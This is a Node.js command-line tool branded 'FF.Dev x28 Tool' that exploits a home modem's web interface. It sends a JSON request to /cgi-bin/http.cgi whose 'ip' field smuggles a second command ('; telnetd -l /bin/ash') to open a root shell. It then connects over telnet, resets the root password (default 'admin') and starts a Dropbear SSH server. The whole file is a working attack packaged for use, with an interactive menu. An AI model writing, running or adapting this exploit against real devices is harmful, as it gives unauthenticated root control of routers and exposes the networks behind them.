const https = require("https");
const net = require("net");
const readline = require('readline');

// Telnet protocol byte values
const IAC = 255;
const DO = 253;
const DONT = 254;
const WILL = 251;
const WONT = 252;

// Clean Telnet negotiation
function processTelnetData(buf, socket) {
    let out = [];
    for (let i = 0; i < buf.length; i++) {
        if (buf[i] === IAC) {
            const cmd = buf[i + 1];
            const opt = buf[i + 2];
            if (cmd === DO || cmd === DONT) {
                socket.write(Buffer.from([IAC, WONT, opt]));
            } else if (cmd === WILL || cmd === WONT) {
                socket.write(Buffer.from([IAC, DONT, opt]));
            }
            i += 2;
        } else {
            out.push(buf[i]);
        }
    }
    return Buffer.from(out);
}

// Send HTTPS request
function sendRequest(ip, sessionId, data) {
    data = JSON.stringify(data);
    const options = {
        hostname: ip,
        port: 443,
        path: "/cgi-bin/http.cgi",
        method: "POST",
        rejectUnauthorized: false,
        headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(data)
        }
    };

    const req = https.request(options, (res) => {
        let body = "";
        console.log("Status Code:", res.statusCode);
        res.on("data", (chunk) => {
            body += chunk;
        });
        res.on("end", () => {
            console.log("Response Body:", body);
        });
    });

    req.on("error", (err) => {
        console.error("Request error:", err.message);
    });

    req.write(data);
    req.end();
}

// Enable SSH via Telnet
function enableSSHviaTelnet(host, port = 23, rootPassword = "admin") {
    return new Promise((resolve, reject) => {
        const client = new net.Socket();
        let isReady = false;

        client.connect(port, host, () => {
            console.log("[*] Telnet connection established");
        });

        client.on("data", (data) => {
            data = processTelnetData(data, client);
            
            if (!isReady && data.includes("#")) {
                isReady = true;
                console.log("[*] Logged into system, executing commands...");

                // Change root password (optional)
                client.write(`echo -e "${rootPassword}\\n${rootPassword}" | passwd root\n`);
                
                // Start Dropbear SSH service
                client.write("dropbearkey -t rsa -f /tmp/dropbear_rsa_host_key\n");
                client.write("/usr/sbin/dropbear -r /tmp/dropbear_rsa_host_key -p 22 -B &\n");
                
                console.log("[*] SSH service started (port 22)");
                console.log("[*] Root password: " + rootPassword);
                
                // Close connection
                setTimeout(() => {
                    client.end();
                    resolve({
                        success: true,
                        message: "SSH successfully enabled",
                        sshPort: 22,
                        rootPassword: rootPassword
                    });
                }, 2000);
            }
        });

        client.on("error", (err) => reject(err));
        client.on("close", () => console.log("[*] Telnet connection closed"));
    });
}

// Exploit modem to enable telnet
function enableTelnetViaExploit(ip, sessionId) {
    console.log(`[*] Exploiting modem: ${ip}`);
    
    // Send telnet enable command
    sendRequest(ip, sessionId, {
        "enabled": "1",
        "ip": "192.168.1.1 ; telnetd -l /bin/ash",
        "cmd": 172,
        "method": "POST",
        "success": true,
        "subcmd": 6,
        "token": "5948b69147b3850eee5e7266188934c5",
        "language": "EN",
        "sessionId": sessionId
    });
    
    console.log("[✓] Telnet enable command sent");
    console.log("[*] Telnet will be available on port 23");
}

// Main menu function
async function main() {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    console.clear();
    console.log("╔══════════════════════════════════════════════╗");
    console.log("║                                              ║");
    console.log("║           FF.Dev x28 Tool v1.0               ║");
    console.log("║        Modem Telnet/SSH Enabler              ║");
    console.log("║                                              ║");
    console.log("╚══════════════════════════════════════════════╝\n");
    console.log("┌──────────────────────────────────────────────┐");
    console.log("│  Author: FF.Dev                              │");
    console.log("│  Version: x28                                 │");
    console.log("│  Type: Security Tool                          │");
    console.log("└──────────────────────────────────────────────┘\n");

    const question = (query) => new Promise((resolve) => rl.question(query, resolve));

    try {
        // Get IP address
        const ip = await question("[?] Enter modem IP address (e.g., 192.168.1.1): ");
        
        // Ask what to enable
        console.log("\n┌─────────────── Options ───────────────┐");
        console.log("│  1. Enable Telnet only                 │");
        console.log("│  2. Enable SSH only                     │");
        console.log("│  3. Enable Both (Telnet + SSH)          │");
        console.log("└─────────────────────────────────────────┘\n");
        
        const choice = await question("[?] Enter your choice (1-3): ");

        if (choice === "1") {
            // Telnet only
            console.log("\n┌─────────────── Telnet Only ──────────────┐");
            const sessionId = await question("│  Session ID (required): ");
            console.log("└─────────────────────────────────────────┘\n");
            
            if (!sessionId.trim()) {
                console.log("[!] Error: Session ID is required for Telnet enable");
                rl.close();
                return;
            }
            
            console.log("[*] FF.Dev x28 Tool - Starting Telnet enable...\n");
            enableTelnetViaExploit(ip.trim(), sessionId.trim());
            
            console.log("\n[✓] Command sent successfully!");
            console.log("[*] Wait 10-20 seconds for Telnet to start");
            console.log("[*] Connect using: telnet " + ip + " 23");
            
        } else if (choice === "2") {
            // SSH only
            console.log("\n┌─────────────── SSH Only ───────────────┐");
            const telnetPort = await question("│  Telnet port [23]: ") || "23";
            const password = await question("│  New root password [admin]: ") || "admin";
            console.log("└─────────────────────────────────────────┘\n");
            
            console.log("[*] FF.Dev x28 Tool - Starting SSH enable...\n");
            console.log("[*] Connecting via Telnet to enable SSH...");
            
            enableSSHviaTelnet(ip.trim(), parseInt(telnetPort), password)
                .then(result => {
                    console.log("\n┌─────────────── Success! ───────────────┐");
                    console.log("│  " + result.message);
                    console.log("├───────────── SSH Details ─────────────┤");
                    console.log("│  IP Address: " + ip);
                    console.log("│  Port: " + result.sshPort);
                    console.log("│  Username: root");
                    console.log("│  Password: " + result.rootPassword);
                    console.log("├─────────────────────────────────────────┤");
                    console.log("│  Connect: ssh root@" + ip);
                    console.log("└─────────────────────────────────────────┘");
                })
                .catch(err => {
                    console.error("\n[!] FF.Dev x28 Error:", err.message);
                    console.log("[!] Make sure Telnet is enabled on the modem");
                });
            
        } else if (choice === "3") {
            // Both
            console.log("\n┌───────────── Both (Telnet+SSH) ─────────┐");
            const sessionId = await question("│  Session ID: ");
            const password = await question("│  New root password [admin]: ") || "admin";
            console.log("└─────────────────────────────────────────┘\n");
            
            if (!sessionId.trim()) {
                console.log("[!] Error: Session ID is required");
                rl.close();
                return;
            }
            
            console.log("[*] FF.Dev x28 Tool - Starting full exploit...\n");
            console.log("[*] Step 1: Enabling Telnet via exploit...");
            enableTelnetViaExploit(ip.trim(), sessionId.trim());
            
            console.log("\n[*] Step 2: Waiting for Telnet to initialize (5 seconds)...");
            setTimeout(() => {
                console.log("\n[*] Step 3: Enabling SSH via Telnet...");
                enableSSHviaTelnet(ip.trim(), 23, password)
                    .then(result => {
                        console.log("\n┌─────────────── Success! ───────────────┐");
                        console.log("│  " + result.message);
                        console.log("├───────────── SSH Details ─────────────┤");
                        console.log("│  IP Address: " + ip);
                        console.log("│  Port: " + result.sshPort);
                        console.log("│  Username: root");
                        console.log("│  Password: " + result.rootPassword);
                        console.log("├─────────────────────────────────────────┤");
                        console.log("│  SSH:   ssh root@" + ip);
                        console.log("│  Telnet: telnet " + ip + " 23");
                        console.log("└─────────────────────────────────────────┘");
                    })
                    .catch(err => {
                        console.error("\n[!] FF.Dev x28 Error:", err.message);
                    });
            }, 5000);
            
        } else {
            console.log("\n[!] Invalid choice. Please select 1, 2, or 3");
        }

        console.log("\n┌─────────────────────────────────────────┐");
        console.log("│  FF.Dev x28 Tool - Completed            │");
        console.log("│  Thank you for using this tool          │");
        console.log("└─────────────────────────────────────────┘\n");

    } catch (error) {
        console.error("\n[!] FF.Dev x28 Error:", error.message);
    } finally {
        rl.close();
    }
}

// Export functions
module.exports = {
    enableSSHviaTelnet,
    enableTelnetViaExploit,
    main,
    version: "x28",
    author: "FF.Dev"
};

// Run if called directly
if (require.main === module) {
    console.log("\x1b[36m%s\x1b[0m", "FF.Dev x28 Tool - Initializing...");
    main().catch(console.error);
}
